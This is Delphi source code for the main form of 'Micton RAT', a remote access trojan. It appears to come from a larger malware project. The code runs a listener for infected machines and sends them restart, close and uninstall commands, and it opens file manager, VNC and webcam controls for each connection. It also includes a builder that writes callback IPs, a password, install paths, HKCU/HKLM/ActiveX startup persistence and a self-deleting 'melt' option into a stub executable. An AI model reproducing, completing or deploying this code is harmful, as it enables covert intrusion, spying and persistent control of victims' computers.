unit uMain;
//{$DEFINE DEMO}
interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, StdCtrls, Buttons, uFunctions, ImgList, Menus,
  uCommands, winsock, uServ, XPMan ,ExtCtrls, syncobjs, shellapi, IniFiles,
  bsSkinData, BusinessSkinForm;

type
  TForm1 = class(TForm)
    pgc1: TPageControl;
    ts1: TTabSheet;
    lvConnections: TListView;
    ilPorts: TImageList;
    pmPorts: TPopupMenu;
    DeletePort1: TMenuItem;
    pmControl: TPopupMenu;
    Filemanager1: TMenuItem;
    Close1: TMenuItem;
    Restart1: TMenuItem;
    Uninstall1: TMenuItem;
    ts5: TTabSheet;
    Filemanager2: TMenuItem;
    ilFlags: TImageList;
    N1: TMenuItem;
    XPManifest1: TXPManifest;
    pm1: TPopupMenu;
    estAll1: TMenuItem;
    N2: TMenuItem;
    DeleteIP1: TMenuItem;
    pm2: TPopupMenu;
    AddUser1: TMenuItem;
    DeleteUser1: TMenuItem;
    LoadProfile1: TMenuItem;
    tmr1: TTimer;
    grp1: TGroupBox;
    lvPorts: TListView;
    edtPort: TEdit;
    btnAdd: TBitBtn;
    grp2: TGroupBox;
    pgc2: TPageControl;
    ts6: TTabSheet;
    lbl5: TLabel;
    lbl6: TLabel;
    lblBProfile: TLabel;
    grp3: TGroupBox;
    lbl2: TLabel;
    lbl4: TLabel;
    lbl3: TLabel;
    shp1: TShape;
    lbl1: TLabel;
    edtBIP: TEdit;
    btn1: TBitBtn;
    lvBIPs: TListView;
    edtBPassword: TEdit;
    edtBPort: TEdit;
    edtBID: TEdit;
    ts7: TTabSheet;
    grp4: TGroupBox;
    lblBCopy: TLabel;
    lblBFilename: TLabel;
    rbBSystem32: TRadioButton;
    rbBWindows: TRadioButton;
    rbBAppData: TRadioButton;
    edtBFilename: TEdit;
    chkBInstall: TCheckBox;
    grp5: TGroupBox;
    chkBHKCU: TCheckBox;
    edtBHKCU: TEdit;
    chkBActiveX: TCheckBox;
    chkBHKLM: TCheckBox;
    edtBHKLM: TEdit;
    edtBActiveX: TEdit;
    chkBStartup: TCheckBox;
    ts9: TTabSheet;
    redtBuild: TRichEdit;
    btn2: TBitBtn;
    btn3: TBitBtn;
    lvProfiles: TListView;
    bsbsnsknfrm1: TbsBusinessSkinForm;
    bskndt1: TbsSkinData;
    bscmprsdstrdskn1: TbsCompressedStoredSkin;
    chkBMelt: TCheckBox;
    procedure btnAddClick(Sender: TObject);
    procedure DeletePort1Click(Sender: TObject);
    procedure lvConnectionsContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure Restart1Click(Sender: TObject);
    procedure Close1Click(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure Filemanager2Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure chkBInstallClick(Sender: TObject);
    procedure chkBStartupClick(Sender: TObject);
    procedure btn1Click(Sender: TObject);
    procedure estAll1Click(Sender: TObject);
    procedure DeleteIP1Click(Sender: TObject);
    procedure edtBPortKeyPress(Sender: TObject; var Key: Char);
    procedure AddUser1Click(Sender: TObject);
    procedure LoadProfile1Click(Sender: TObject);
    procedure DeleteUser1Click(Sender: TObject);
    procedure btn3Click(Sender: TObject);
    procedure btn2Click(Sender: TObject);
    procedure tmr1Timer(Sender: TObject);
    procedure CreateTray;
    procedure FormCreate(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
    procedure lvConnectionsAdvancedCustomDrawItem(Sender: TCustomListView;
      Item: TListItem; State: TCustomDrawState; Stage: TCustomDrawStage;
      var DefaultDraw: Boolean);
    procedure chkBHKCUClick(Sender: TObject);
    procedure Uninstall1Click(Sender: TObject);
  private
    { Private declarations }
  public
    CenterList:TThreadList;
    sCurrentProfile:String;
    //TrayToolTip
    TrayIconData: TNotifyIconData;
    critTrayTip:TCriticalSection;
    procedure showTrayToolTip(strTitle: string; strText: string);
  end;

var
  Form1: TForm1;
  mListviewCriticalSection:TCriticalSection;
Function SendPacket(mSock:Integer;bCommand:Byte; sString:String):Boolean;
implementation

uses uVNC, uWebcam, uControl, uClients, uFlags;

{$R *.dfm}
procedure AddPortToIni;
var
  iniSettings:TIniFile;
  intPorts:Integer;
  i:Integer;
begin
  iniSettings := TIniFile.Create(GetCurrentDir + '\settings.ini');
  try
    intPorts := Form1.lvPorts.Items.Count;
    if intPorts <> 0 then begin
      iniSettings.WriteInteger('Connection','Ports',intPorts);
      for i := 0 to intPorts - 1 do begin
        iniSettings.WriteInteger('Connection','Port' + IntToStr(i + 1),StrToInt(Form1.lvPorts.Items.Item[i].Caption));
      end;
    end;
  finally
    iniSettings.Free;
  end;
end;

procedure AddPort(iPort:Integer);
var
  lstPort: TListItem;
  tempThread:TMyThread;
begin
  //Configure Socket
  lstPort := Form1.lvPorts.Items.Add;
  tempThread := TMyThread.Create(True);
  tempThread.SetPortTo(iPort,lstPort);
  lstPort.Caption := InttoStr(iPort);
  lstPort.SubItems.Add('Active');
  lstPort.SubItems.Objects[0] := tempThread;
  AddPortToIni;
  tempThread.Resume;
end;

Function SendPacket(mSock:Integer;bCommand:Byte; sString:String):Boolean;
var
  lSent, lPackLen:Cardinal;
  arrData :array of Byte;
  dwBuffLen:Cardinal;
begin
  Result := False;
  dwBuffLen := Length(sString);
  lPackLen := SizeOf(TCustomPacketHeader) + dwBuffLen;
  SetLength(arrData,lPackLen);
  LPSocketHeader(@arrData[0])^.bFlag := $01;
  LPSocketHeader(@arrData[0])^.dwPackLen := DWORD(dwBuffLen);
  LPSocketHeader(@arrData[0])^.bPackType := bCommand;
  MoveMemory(@arrData[SizeOf(TCustomPacketHeader)],@sString[1],dwBuffLen);
  lSent := Send(mSock,arrData[0],lPackLen,0);
  If lSent = lPackLen then
    Result := True;
end;

procedure TForm1.Filemanager2Click(Sender: TObject);
var
  tempInfo:TClientThread;
  sTempStr:String;
begin
  if lvConnections.Selected <> nil then begin
    tempInfo := TClientThread(lvConnections.Selected.SubItems.Objects[0]);
    if tempInfo.fControl = nil then begin
      tempInfo.fControl := TForm10.Create(nil);
    end;
    sTempStr := lvConnections.Selected.SubItems.Strings[1];
    tempInfo.fControl.Caption := 'Filemanager - ' + sTempStr;
    tempInfo.fControl.mClThread := tempInfo;
    tempInfo.fControl.sUsername := sTempStr;
    tempInfo.fControl.Show;
  end;
end;

procedure TForm1.FormClose(Sender: TObject; var Action: TCloseAction);
var
  i:integer;
begin
  if lvPorts.Items.Count = 0 then exit;
  for i := 0 to lvPorts.Items.Count - 1 do begin
    CloseSocket(TMyThread(lvPorts.Items.Item[i].SubItems.Objects[0]).Sock);
  end;
  WSACleanUP();
end;

procedure ReadPorts;
var
  iniSettings:TINIFILE;
  intPorts:Integer;
  intSelPort:Integer;
  i:Integer;
begin
  iniSettings := TIniFile.Create(GetCurrentDir + '\settings.ini');
  try
    intPorts := iniSettings.ReadInteger('Connection','Ports',0);
    if intPorts <> 0 then begin
      for i := 1 to intPorts do begin
        intSelPort := iniSettings.ReadInteger('Connection','Port' + IntToStr(i),0);
        if intSelPort <> 0 then
          AddPort(intSelPort);
      end;
    end;
  finally
    iniSettings.Free;
  end;
end;
procedure TForm1.FormCreate(Sender: TObject);
begin
  CreateTray;
  ReadPorts;
end;

procedure TForm1.FormDestroy(Sender: TObject);
begin
  Shell_NotifyIcon(NIM_DELETE, @TrayIconData);
end;

procedure TForm1.showTrayToolTip;
begin
  critTrayTip.Enter;
  with TrayIconData do
  begin
    uFlags := NIF_INFO;
    hIcon := Application.Icon.Handle;
    StrPCopy(szInfoTitle,pchar(strTitle));
    StrPCopy(szInfo,pchar(strText));
    dwInfoFlags:=NIIF_INFO;
    uTimeout:= 10*1000;
  end;
  Shell_NotifyIcon(NIM_MODIFY, @TrayIconData);
  trayicondata.uFlags:=0;
  critTrayTip.Leave;
end;

procedure TForm1.CreateTray;
begin
  with TrayIconData do
  begin
    cbSize := SizeOf(TrayIconData);
    Wnd := Handle;
    uID := 0;
    uFlags := NIF_MESSAGE + NIF_ICON + NIF_TIP;
    uCallbackMessage := WM_USER + 1;
    hIcon := Application.Icon.Handle;
    StrPCopy(szTip, Application.Title);
  end;
  Shell_NotifyIcon(NIM_ADD, @TrayIconData);
  critTrayTip := TCriticalSection.Create;
end;

procedure TForm1.FormShow(Sender: TObject);
begin
{$IFDEF DEMO}
  Form1.Caption := 'DEMO Micton RAT ' + _RATVER + ' - Connections: 0';
{$ELSE}
  Form1.Caption := 'Micton RAT ' + _RATVER + ' - Connections: 0';
{$ENDIF}
  CenterList := TThreadList.Create;
  ListProfiles;
  pgc2.Visible := False;
  GetUsersFolder;
  mListviewCriticalSection := TCriticalSection.Create;
end;

procedure TForm1.LoadProfile1Click(Sender: TObject);
begin
  if lvProfiles.Selected = nil then exit;
  LoadProfile(lvProfiles.Selected.Caption);
  pgc2.Visible := True;
  lvProfiles.Visible := False;
  sCurrentProfile := lvProfiles.Selected.Caption;
  lblBProfile.Caption := sCurrentProfile;
end;

procedure TForm1.lvConnectionsAdvancedCustomDrawItem(Sender: TCustomListView;
  Item: TListItem; State: TCustomDrawState; Stage: TCustomDrawStage;
  var DefaultDraw: Boolean);
begin
  if item.SubItems[4] <> _RATVER then
     Sender.Canvas.Font.Color := clRed
   else
     Sender.Canvas.Font.Color := clBlack;
end;

procedure TForm1.lvConnectionsContextPopup(Sender: TObject; MousePos: TPoint;
  var Handled: Boolean);
begin
  If lvConnections.Selected = nil then
    Handled := True;
end;

procedure TForm1.Restart1Click(Sender: TObject);
begin
  if lvConnections.Selected <> nil then begin
    if lvConnections.Selected.SubItems.Objects[0] <> nil then begin
      TClientThread(lvConnections.Selected.SubItems.Objects[0]).SendData(PACK_RESTART,'');
    end;
  end;
end;

procedure TForm1.tmr1Timer(Sender: TObject);
var
  cTimeNow:Cardinal;
  i:integer;
  mThread:TClientThread;
begin
  tmr1.Enabled := False;
  mListViewCriticalSection.Enter;
  try
    if lvConnections.Items.Count <> 0 then begin
      for i := 0 to lvConnections.Items.Count - 1 do begin
        mThread := TClientThread(lvConnections.Items.Item[i].SubItems.Objects[0]);
        if mThread.bPingSent = false then begin
          mThread.SendData(PACK_PING,'');
          mThread.myLastTime := 0;
          mThread.bPingSent := True;
        end else begin
          cTimeNow := mThread.myLastTime;
          mThread.bPingSent := false;
          if cTimeNow = 0 then
            CloseSocket(mThread.mySocket);
        end;
        Application.ProcessMessages;
      end;
    end;
  finally
    mListViewCriticalSection.Leave;
    tmr1.Enabled := True;
  end;
end;

procedure TForm1.Uninstall1Click(Sender: TObject);
begin
 if lvConnections.Selected <> nil then begin
  if lvConnections.Selected.SubItems.Objects[0] <> nil then begin
   TClientThread(lvConnections.Selected.SubItems.Objects[0]).SendData(PACK_UNINSTALL,'');
  end;
 end;
end;

procedure TForm1.AddUser1Click(Sender: TObject);
var
  sUser:String;
begin
  sUser := InputBox('Choose a Profilename','Profilename','User');
  if sUser <> '' then begin
    if AddNewProfile(sUser) then
      ListProfiles;
  end;
end;

procedure TForm1.btn1Click(Sender: TObject);
var
  lstIP:TListItem;
begin
  if edtBIP.Text <> '' then begin
    lstIP := lvBIPs.Items.Add;
    lstIP.Caption := edtBIP.Text;
    lstIP.SubItems.Add('Not tested!');
    edtBIP.Text := '';
  end;
end;

procedure TForm1.btn2Click(Sender: TObject);
var
  bBuilderInfo:PBuilderInfo;
  lstrIPs:String;
  lDataLen:Cardinal;
begin
  If CheckInputs then begin
    SaveProfile(sCurrentProfile);
    lstrIPs := CollectItems(lvBIps);
    lDataLen := SizeOf(TBuilderInfo) - 1 + Length(lstrIPs);
    GetMem(bBuilderInfo,lDataLen);
    with bBuilderInfo^ do begin
      dwPort := StrToInt(edtBPort.Text);
      strPassword := edtBPassword.Text;
      bInstall := chkBInstall.Checked;
      bStartup := chkBStartup.Checked;
      strFilename := edtBFilename.Text;
      dwDir := GetRadioButton;
      bHKCU := chkBHKCU.Checked;
      bHKLM := chkBHKLM.Checked;
      bActiveX := chkBActiveX.Checked;
      strID := edtBID.Text;
      strHKCUStartup := edtBHKCU.Text;
      strHKLMStartup := edtBHKLM.Text;
      strActiveXStartup := edtBActiveX.Text;
      bPersistance := False;
      bMelt := chkBMelt.checked;
      dwIPsLen := Length(lstrIPs);
      MoveMemory(@strIPs,@lstrIPs[1],Length(lstrIPs));
    end;
    if PrepareStub then begin
      AddBOKLog('Server is OK!');
      if WriteResource(bBuilderInfo,lDataLen) then begin
        AddBOKLog('Settings written to File!');
        AddBOKLog('Server built successfully!');
      end else
        AddBFailLog('Settings cant be written to File!');
    end else
      AddBFailLog('Cant copy stub.exe to server.exe');
    FreeMem(bBuilderInfo);
  end;
end;

procedure TForm1.btn3Click(Sender: TObject);
begin
  pgc2.Visible := False;
  lvProfiles.Visible := True;
end;

procedure TForm1.btnAddClick(Sender: TObject);
begin
  if IsNumeric(edtPort.Text) then
    AddPort(StrToInt(edtPort.Text))
  else
    MessageBox(Application.Handle,Pchar('Cant add Port, please check if input is a valid number!'),PChar('Error'),0);
  edtPort.Text := '';
end;

procedure TForm1.chkBStartupClick(Sender: TObject);
var
  bBool:Boolean;
begin
  bBool :=  chkBStartup.Checked;
  chkBHKCU.Checked := True;
  chkBHKCU.Enabled := bBool;
  //chkBHKLM.Enabled := bBool;
  //chkBActiveX.Enabled := bBool;
  edtBHKCU.Enabled := bBool;
  //edtBHKLM.Enabled := bBool;
  //edtBActiveX.Enabled := bBool;
end;

procedure TForm1.chkBHKCUClick(Sender: TObject);
begin
 if chkBHKCU.Checked = False then chkBStartup.Checked:=False;
 
end;

procedure TForm1.chkBInstallClick(Sender: TObject);
var
  bBool:Boolean;
begin
  bBool := chkBInstall.Checked;
  lblBFilename.Enabled := bBool;
  lblBCopy.Enabled := bBool;
  rbBWindows.Enabled := bBool;
  rbBAppData.Enabled := bBool;
  //rbBAppData.Checked := True;
  edtBFilename.Enabled := bBool;
  if bBool then chkBStartup.checked := True;
end;

procedure TForm1.Close1Click(Sender: TObject);
begin
  if lvConnections.Selected <> nil then begin
    if lvConnections.Selected.SubItems.Objects[0] <> nil then begin
      TClientThread(lvConnections.Selected.SubItems.Objects[0]).SendData(PACK_CLOSE,'');
    end;
  end;
end;

procedure TForm1.DeleteIP1Click(Sender: TObject);
begin
  if lvBIPs.Selected <> nil then
    lvBIPs.Selected.Delete;
end;

procedure TForm1.DeletePort1Click(Sender: TObject);
begin
  if lvPorts.Selected = nil then Exit;
  if lvPorts.Selected.SubItems.Objects[0] <> nil then begin
    try
      CloseSocket(TMyThread(lvPorts.Selected.SubItems.Objects[0]).Sock);
    except
      Application.ProcessMessages;
    end;
  end;
end;

procedure TForm1.DeleteUser1Click(Sender: TObject);
begin
  if lvProfiles.Selected = nil then exit;
  DeleteProfile(lvProfiles.Selected.Caption);
  ListProfiles;
end;

procedure TForm1.edtBPortKeyPress(Sender: TObject; var Key: Char);
begin
  if (Key in ['0'..'9', #8]) = False then begin
    Key := #0;
  end;
end;

procedure TForm1.estAll1Click(Sender: TObject);
var
  i:integer;
begin
  try
    if lvBIPs.Items.Count < 1 then exit;
    for i := 0 to lvBIPs.Items.Count - 1  do begin
      if TestIP(lvBIPs.Items.Item[i].Caption, StrToInt(edtBPort.Text)) then
        lvBIPs.Items.Item[i].SubItems.Strings[0] := 'Works!'
      else
        lvBIPs.Items.Item[i].SubItems.Strings[0] := 'Failed!';
      Application.ProcessMessages;
    end;
  except
    MessageDlg('Invalid Port!', MTWARNING, [MBOK], 0);
  end;
end;

end.
